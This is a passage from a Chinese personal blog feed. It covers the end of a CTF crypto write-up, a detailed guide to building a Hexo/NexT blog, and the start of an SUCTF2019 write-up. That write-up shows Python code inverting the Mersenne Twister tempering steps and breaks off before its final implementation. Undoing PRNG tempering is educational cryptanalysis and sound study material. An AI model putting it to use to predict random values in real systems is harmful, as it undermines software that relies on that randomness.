<p>我错了，马老师我是新来的，我不懂规矩<br>回看了下题目，因为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = gmpy2.next_prime(bytes_to_long(flag))</span><br></pre></td></tr></table></figure>

<p>所以知道了d就知道了flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不太懂，抄了几句听到的话</p>
<img alt="【2021红明谷】ezCRT-8fd251de.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-8fd251de.png" width="" height="" >

<img alt="【2021红明谷】ezCRT-48a0dabd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-48a0dabd.png" width="" height="" >]]></content>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo搭建博客指北</title>
    <url>/posts/9db4668f/</url>
    <content><![CDATA[<p>马上就能拥有自己的博客了，开不开心，激不激动；我用的是</p>
<ul>
<li>ubuntu18，处于windows的子系统</li>
<li>hexo是5.4.0</li>
<li>因为NexT主题比较成熟，所以先拿这个练练手，是8.8.0版本的</li>
</ul>
<p>更多信息可以在<a href="https://hexo.io/zh-cn/docs/">官网文档</a>查询，此外还看了<a href="https://www.bilibili.com/video/BV1Yb411a7ty/?spm_id_from=333.788.recommend_more_video.0">b站up主的超级良心视频</a></p>
<span id="more"></span>
<h1 id="如何用hexo搭建博客"><a href="#如何用hexo搭建博客" class="headerlink" title="如何用hexo搭建博客"></a>如何用hexo搭建博客</h1><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><h3 id="一、安装git和node-js"><a href="#一、安装git和node-js" class="headerlink" title="一、安装git和node.js"></a>一、安装git和node.js</h3><p><a href="http://git-scm.com/download/linux">git</a>，我要最新的，更新遇到的问题可以参考<a href="https://4xwi11.github.io/posts/ade40a32/">我的ubuntu软件更新失败解决</a></p>
<p><a href="https://github.com/nodesource/distributions">node.js</a>，就用长期支持的14版本吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003233927033.png" alt="image-20211003233927033"></p>
<p>最后检查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<h3 id="二、安装hexo"><a href="#二、安装hexo" class="headerlink" title="二、安装hexo"></a>二、安装hexo</h3><p>可能遇到错误，我直接<code>sudo</code>可解决</p>
<hr>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>这个命令会一起安装hexo的命令，所以能在命令行直接敲太香了</p>
<p>添加到环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo &#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27; &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure>

<p>这样以后直接用<code>hexo + 命令</code>就可以了</p>
<h2 id="搭站"><a href="#搭站" class="headerlink" title="搭站"></a>搭站</h2><p>首先，初始化hexo最基本的文件到我们本地的目录，最后一个是文件名自己取，比如我就叫<code>4XWi11</code>，放我自己的 博客</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init 4XWi11</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 4XWi11;npm install</span><br></pre></td></tr></table></figure>

<p>生成网站页面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g[enerate]</span><br></pre></td></tr></table></figure>

<p>可以看到生成了一个<code>public</code>的文件，就是我们生成的网站目录</p>
<p>打开这个网页，启动服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s[erver]</span><br></pre></td></tr></table></figure>

<p>当然一开始是本地的</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul>
<li><p>新建文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;BLOG_TITLE&quot;</span><br></pre></td></tr></table></figure>

<p>其实就是新建了一个md文件</p>
</li>
<li><p>进行博客编辑</p>
</li>
<li><p>重新生成启动</p>
<p>再次运行<code>g</code>和<code>s</code>命令</p>
</li>
</ul>
<p>可惜可惜，和github一样不支持latex</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>这里用Git部署</p>
<p>所以当然最最开始需要在github上有一个创库，<strong>注意：仓库的命名一定要是USER_NAME.github.io</strong>，比如我的就是<code>4XWi11.github.io</code>，后续浏览器可以直接访问</p>
<p>安装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>如果不确定插件是否已经安装，可以用下条命令检测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm list hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>然后更改<code>_config.yml</code>文件的选项，设置部署在<code>git</code>上，并给出仓库地址</p>
<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>完成部署</p>
<p>遇到了密码不匹配的问题，要在输入密码的地方输入token</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171639758.png" alt="image-20211003171639758"></p>
<p>勾选</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171714542.png" alt="image-20211003171714542"></p>
<p>生成将token复制到需要填密码的地方即可</p>
<p>但是我又遇到上述操作做完还是认证失败的情况</p>
<p>然后把仓库删了重新创建一遍就好了，但总不能更新一遍就删掉重来吧</p>
<p><em>我知道了，不告诉你们，我再也不乱动方向盘了</em></p>
<p>但是后面还可能出现连不上github的情况，开关一下代理有时候可以解决</p>
<p>可是不知道是不是子系统的原因，我以为它会帮我自动记忆，没想到每次都要手输，看看之后有没有好的解决办法</p>
<h2 id="NexT主题"><a href="#NexT主题" class="headerlink" title="NexT主题"></a>NexT主题</h2><p>这里我跟着<a href="https://theme-materialized.github.io/how-to-build-a-hexo-blog/">materialized作者的博客</a>，一起来尝试NexT主题的配置</p>
<p>首先当然是把主题从github下载下来，放在themes目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h3 id="0x101-换图标的问题"><a href="#0x101-换图标的问题" class="headerlink" title="0x101 换图标的问题"></a>0x101 换图标的问题</h3><p>图标来自<a href="https://fontawesome.com/v5.15/icons?d=gallery&p=2">FontAwesome</a></p>
<p>图标的名称，建议点开那个图标，你会发现全称</p>
<h3 id="0x102-设置评论的问题"><a href="#0x102-设置评论的问题" class="headerlink" title="0x102 设置评论的问题"></a>0x102 设置评论的问题</h3><p>没有评论的博客是没有灵魂的，但是NexT8.8不支持内置valine</p>
<p>废了废了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141656383.png" alt="image-20211006141656383"></p>
<p>这个等配置好latex再来配置吧</p>
<hr>
<p>最后决定用utterances了，配置方便，也不用挂梯子，只要有一个github账号，师傅们就可以找我玩啦</p>
<p>怎么配置可以看<a href="https://jasper1024.com/jasper/968d55ac/#languages-yml">这位师傅的</a></p>
<h3 id="0x103-代码主题"><a href="#0x103-代码主题" class="headerlink" title="0x103 代码主题"></a>0x103 代码主题</h3><p>首先选择引擎</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141448204.png" alt="image-20211006141448204"/>

<p>然后再选主题</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141336676.png" alt="image-20211006141336676"/>

<p>这里可以预览<a href="https://theme-next.js.org/highlight/">https://theme-next.js.org/highlight/</a></p>
<h3 id="0x104-背景图片"><a href="#0x104-背景图片" class="headerlink" title="0x104 背景图片"></a>0x104 背景图片</h3><p>我跟着<a href="https://hxhowl.com/posts/e6f9a475/">这篇博客</a>做的</p>
<h3 id="0x105-更改字体颜色"><a href="#0x105-更改字体颜色" class="headerlink" title="0x105 更改字体颜色"></a>0x105 更改字体颜色</h3><p>因为换了背景可能有footer的颜色看不清，看这位<a href="https://blog.csdn.net/weixin_40837922/article/details/88047241">师傅的</a>改了下颜色</p>
<h3 id="0x106-更改字体大小"><a href="#0x106-更改字体大小" class="headerlink" title="0x106 更改字体大小"></a>0x106 更改字体大小</h3><p>16px小大，喜欢殷实一点的，我这个版本在这里调，前面有一大推东西，直接拉到最后em那里改就好</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007114800161.png" alt="image-20211007114800161"/>

<h3 id="0x107-吉祥物"><a href="#0x107-吉祥物" class="headerlink" title="0x107 吉祥物"></a>0x107 吉祥物</h3><p>跟着上面背景图片的师傅搞了下，先用他的wanko，但看到这只狗觉得好爱哈哈哈，暂时就不换别的了（其他的都是二刺螈（doge））</p>
<h3 id="0x108-图片预览"><a href="#0x108-图片预览" class="headerlink" title="0x108 图片预览"></a>0x108 图片预览</h3><p>这个是真的坑。网上教程一大堆，因为另外一个会显示图片名称，而我却不会设置其不显示，所以我用的是zoom那个，安装倒不是问题直接在根目录按照github上npm</p>
<p>但是如果在markdown里用typora调一下图片的显示比例，在博客里预览时就会发生位置错乱</p>
<p>将就吧，以后尽量截图时不要截太大</p>
<h3 id="0x109-透明度影响搜索"><a href="#0x109-透明度影响搜索" class="headerlink" title="0x109 透明度影响搜索"></a>0x109 透明度影响搜索</h3><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008010043156.png" alt="image-20211008010043156"></p>
<p>omg发生这样的事情我很抱歉</p>
<p>网上也有教程，但是只能舍去透明度效果了，毕竟实用比较重要</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008011640711.png" alt="image-20211008011640711"></p>
<p>反正就是把这两个style.styl（因为我搞不清哪一个）中head的opacity设置去掉</p>
<p>这样侧边菜单栏就没有透明特效了，但是其他保留</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008011916547.png" alt="image-20211008011916547"></p>
<p>其实海星</p>
<h3 id="0x10A-博客改名"><a href="#0x10A-博客改名" class="headerlink" title="0x10A 博客改名"></a>0x10A 博客改名</h3><p>参考<a href="https://roro4ever.github.io/2019/11/28/%E7%94%A8-hexo-console-rename-%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8D/%E7%94%A8-hexo-console-rename-%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8D/">这篇博客</a></p>
<p>好像有bug，之后碰到再说吧，文件名起合适一点</p>
<p>报错了，不用了</p>
<h3 id="0x10B-博客加密"><a href="#0x10B-博客加密" class="headerlink" title="0x10B 博客加密"></a>0x10B 博客加密</h3><p>没想到这个竟然会派上用场</p>
<p>参考<a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt</a></p>
<h3 id="0x10C-博客不分页"><a href="#0x10C-博客不分页" class="headerlink" title="0x10C 博客不分页"></a>0x10C 博客不分页</h3><p>习惯博客不分页，这样<code>ctrl + f</code>好搜索</p>
<p>只要将根目录下的_config.yml中的per_page的值改成0就好了，当然如果想设置一页几篇，改成对应的数字就好了</p>
<p>但是首页加载很慢，不太行，所以设置首页的 <code>index_generator</code> 的属性 <code>per_page</code> 为7，也就是一页显示7篇，无所谓反正不能显示完全，一周七篇吧（doge）</p>
<p>但归档和分类里是不分页的，方便查看，只要将 <code>Pagination</code> 的 <code>per_page</code> 修改成0就好了</p>
<p>好</p>
<h3 id="0x10D-阅读量统计"><a href="#0x10D-阅读量统计" class="headerlink" title="0x10D 阅读量统计"></a>0x10D 阅读量统计</h3><p>呜呜呜，我遇到大坑了，本来用来valine的，但感觉不准确，于是用了更方便的不蒜子，直接改一个true就能用，感觉还行</p>
<p>但是自从我开启看板狗就不能显示了，网上也有很多解释，<a href="https://iamshen.github.io/posts/89986481/">这篇</a>的帮助很大</p>
<p>但是不行呜呜呜，我放在同一目录下，应该不会是没找到吧，暂时不晓得怎么搞</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;%- <span class="keyword">if</span> theme.busuanzi_count.enable %&#125;</span><br><span class="line">  &#123;# &lt;script&#123;&#123; pjax &#125;&#125; <span class="keyword">async</span> src=<span class="string">&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt; #&#125;</span><br><span class="line">  &lt;script&#123;&#123; pjax &#125;&#125; <span class="keyword">async</span> src=<span class="string">&quot;busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<p>所以我忍痛把狗去了</p>
<p>不——狗狗那么可耐。但我实在觉得没有阅读量的博客是没有盼头的，所以我换了统计的工具（还好才刚开始阅读量不大）</p>
<p>用的是LeanCloud，配置过程简单，网上很多，这里不赘述</p>
<p>但是LeanCloud不准啊，只会是0、1、2，艹，什么狗⑧（最后反复纵横跳还是改成busuanzi了</p>
<hr>
<h3 id="0x10E-Latex"><a href="#0x10E-Latex" class="headerlink" title="0x10E Latex"></a>0x10E Latex</h3><p>新版本的缺点就是网上的教程比较难找，但是我把这些全部开起来就可以了</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095926085.png" alt="image-20211007095926085"/>

<p>还自动在居中公式后面加上了标号，早晚有一天我要把这个给去了</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095954761.png" alt="image-20211007095954761"/>

<h4 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h4><p>很奇怪，大括号内换行，四个<code>\</code>就换过去了，但是其他的地方不行</p>
<p>所以只能这样了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;align&#125;</span><br><span class="line">g_1=g^&#123;r_1\times(p-1)&#125;\ mod\ N\\\\</span><br><span class="line">g_2=g^&#123;r_2\times(q-1)&#125;\ mod\ N</span><br><span class="line">\end&#123;align&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007165137679.png" alt="image-20211007165137679"></p>
<p>还行，也就是亿点麻烦，或者一行写在一个latex居中块中</p>
<ul>
<li><p>如果用<code>align*</code>，会去掉左边的式子序号</p>
</li>
<li><p><code>aligned</code>，整个作为一个式子，并添加序号</p>
</li>
</ul>
<p>对，一行一句话可以解决绝大部分显示问题</p>
<p>如果不想要序号的话可以在该行最后加一个\notag，虽然编译器的latex会报错，但是博客上可以达到相应效果</p>
<h4 id="方程组大括号"><a href="#方程组大括号" class="headerlink" title="方程组大括号"></a>方程组大括号</h4><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007161605021.png" alt="image-20211007161605021"></p>
<p><strong>模板</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;cases&#125;</span><br><span class="line">x\equiv cs_1\ (mod\ ms_1)\\\\</span><br><span class="line">x\equiv cs_2\ (mod\ ms_2)\\\\</span><br><span class="line">\vdots\qquad \vdots \qquad\qquad \vdots\\\\</span><br><span class="line">x\equiv cs_8\ (mod\ ms_8)\\\\</span><br><span class="line">x\equiv cs_9\ (mod\ ms_9)    </span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

<h4 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h4><p>$$<br>L=\begin{bmatrix}<br>1 &amp; -N &amp; 0 &amp; N^2\\<br>0 &amp; e_1 &amp; -e_1 &amp; -e_1N\\<br>0 &amp; 0 &amp; e_2 &amp; -e_2N\\<br>0 &amp; 0 &amp; 0 &amp; e_1e_2<br>\end{bmatrix}<br>$$</p>
<p><strong>模板</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">L=\begin&#123;bmatrix&#125;</span><br><span class="line">1 &amp; -N &amp; 0 &amp; N^2\\\\</span><br><span class="line">0 &amp; e_1 &amp; -e_1 &amp; -e_1N\\\\</span><br><span class="line">0 &amp; 0 &amp; e_2 &amp; -e_2N\\\\</span><br><span class="line">0 &amp; 0 &amp; 0 &amp; e_1e_2</span><br><span class="line">\end&#123;bmatrix&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Zn"><a href="#Zn" class="headerlink" title="Zn*"></a>Zn*</h4><p>用<code>\Z</code>没有这个空心Z的效果，要用<code>\mathbb&#123;Z&#125;</code><br><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008124805352.png" alt="image-20211008124805352"></p>
<h4 id="不要再Latex里面写中文"><a href="#不要再Latex里面写中文" class="headerlink" title="不要再Latex里面写中文"></a>不要再Latex里面写中文</h4><p>斜体是真的不好看，要么放在外面，要么为了居中效果，可以用英文</p>
<h4 id="一行不要太长"><a href="#一行不要太长" class="headerlink" title="一行不要太长"></a>一行不要太长</h4><p>太长，记得发博客的时候在适当位置分段</p>
<h4 id="下划线变斜体"><a href="#下划线变斜体" class="headerlink" title="下划线变斜体"></a>下划线变斜体</h4><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102214225741.png" alt="image-20211102214225741"></p>
<p>如果没有蓝色的斜杆，是没有latex效果的</p>
<h3 id="0xFFF-遇到的几个大坑"><a href="#0xFFF-遇到的几个大坑" class="headerlink" title="0xFFF 遇到的几个大坑"></a>0xFFF 遇到的几个大坑</h3><p>真的是坑</p>
<h4 id="搜索功能不全"><a href="#搜索功能不全" class="headerlink" title="搜索功能不全"></a>搜索功能不全</h4><p>一开始还以为是next的bug，有些明显有的东西都搜不到，其实是search.xml文件utf-8编码出现了错误</p>
<p>因为有些比赛中的二进制文件我直接粘贴进来了，有些utf-8表示不了，比如下面这个</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116180638489.png" alt="image-20211116180638489"></p>
<p>导致了在生成的search.xml里报错，只需要根据报错把这些非utf-8东西都给去掉或者用截图替换，就OK了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116180848617.png" alt="image-20211116180848617"></p>
<p>可能报错的位置不是很精准，但是在报错指向的那篇文章里找找就没错</p>
<p>当改完所有的错误看到这一串就大功告成了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116184108250.png" alt="image-20211116184108250"></p>
<h4 id="奇怪的白块"><a href="#奇怪的白块" class="headerlink" title="奇怪的白块"></a>奇怪的白块</h4><p>chrome浏览器使用了一段时间出现的问题，很难受，一直闪现出恶心的白块</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211106104514585.png" alt="image-20211106104514585"></p>
<p>也不是卡吧，换个火狐浏览器没问题（但不想开两个浏览器，一开始把透明效果删了就没问题，看到有师傅的博客可以在chrome开不透明度效果，有空跟着他的文章学一下</p>
<p>后来七改八改我也不知道怎么的就好了，好像多了一个padding，然后把这个padding的透明度设为0，就不会出现这恶心的白块了。。</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116220740490.png" alt="image-20211116220740490"></p>
<p>前端博大精深，是我不配</p>
]]></content>
      <categories>
        <category>如何用hexo搭建博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>MT19937 fr. SUCTF2019 MT</title>
    <url>/posts/ca3b3eaf/</url>
    <content><![CDATA[<p>位运算的题目老不会了</p>
<img alt="[SUCTF2019]MT 我也很异或呢-bdf4ba97.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-bdf4ba97.png" width="" height="">

<p>其实这篇MT19937，我的解法不是很正规，可以看我MT19937标签下的另外一篇</p>
<p>MT19937是伪随机数的生成算法，下面通过一道题目来了解什么是MT19937，以及它如何被预测</p>
<span id="more"></span>

<h1 id="SUCTF2019-MT"><a href="#SUCTF2019-MT" class="headerlink" title="[SUCTF2019] MT"></a>[SUCTF2019] MT</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>源码稍有改变，代码正规范点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span>     <span class="comment"># 高13位不变</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span>     <span class="comment"># 低9位不变</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span>    <span class="comment"># 低17位不变</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span>     <span class="comment"># 高19位不变</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) // <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">transformed_flag = transform(flag[<span class="number">5</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;transformed_flag:&#x27;</span>, transformed_flag)</span><br><span class="line"><span class="comment"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></span><br></pre></td></tr></table></figure>

<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>最关键的就是convert这个加密流程了，写了点注释，但怎么感觉像是把明文破坏了</p>
<h3 id="第一四组位运算"><a href="#第一四组位运算" class="headerlink" title="第一四组位运算"></a>第一四组位运算</h3><p>所以，我决定自己试一遍，试了第一组</p>
<p>一试不得了，我发现了，有被修复的可行性的，算法看下图</p>
<img alt="[SUCTF2019]MT 我也很异或呢-f4ee9bb3.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-f4ee9bb3.png" width="" height="">

<p>我另外随便（后来发现不能太随便）搞了长度为4的字符来模拟一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:])-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">assert</span> y &gt; <span class="number">0</span></span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:]</span><br><span class="line">    high13 = c[<span class="number">0</span>:x]</span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    flag = <span class="string">b&#x27;abcd&#x27;</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bin</span>(m)[<span class="number">2</span>:])</span><br><span class="line">    <span class="comment"># m = m ^ m &gt;&gt; 13</span></span><br><span class="line">    output = second_cal_re(m)</span><br><span class="line">    <span class="keyword">assert</span> long_to_bytes(output) == flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>测试结果没有报错，成功（虽然在后面我发现了致命的问题，根据选取字符的不同，这个逆函数的结果不一定是对的，比如<code>b&#39;1234&#39;转数字是9位，而b&#39;abcd&#39;是8位</code>，这就具有不确定性了）</p>
<p>显然第四个位运算和第一个位运算是同一类型的，用同样的方法，也可以逆回来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forth_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:])-x</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:]</span><br><span class="line">    part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    output = <span class="built_in">int</span>(part1+part2, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>然后我稍加合并，这两个位运算的逆过程就是这样，经过我多轮的测试，在本题应该不会出错，为了方便食用，后面我贴的都节选自最后跑出来的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>))-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">if</span> y &lt;= <span class="number">0</span>:</span><br><span class="line">        y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)) - x</span><br><span class="line">        c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">        <span class="comment"># 高x位完全相同</span></span><br><span class="line">        part1 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">        part2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:], <span class="number">2</span>) ^ <span class="built_in">int</span>(c[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">        output = <span class="built_in">int</span>(part1 + part2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># 高x位完全相同</span></span><br><span class="line">    high13 = c[<span class="number">0</span>:x].zfill(x)</span><br><span class="line">    <span class="comment"># 中间的几位</span></span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:].zfill(y)</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<h3 id="第二三组位运算"><a href="#第二三组位运算" class="headerlink" title="第二三组位运算"></a>第二三组位运算</h3><p>然后我们再看第二和第三个位运算变化，如法炮制，大致算法参照如下</p>
<img alt="[SUCTF2019]MT 我也很异或呢-86361ff5.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-86361ff5.png" width="" height="" >

<p>大致的思路就是，最开始低9位是保持不变的，我们可以用第九位反推出13到21位，知道了13到21位，又可以推出9到12位，依次类推，整个过程是可逆的</p>
<p>实现</p>
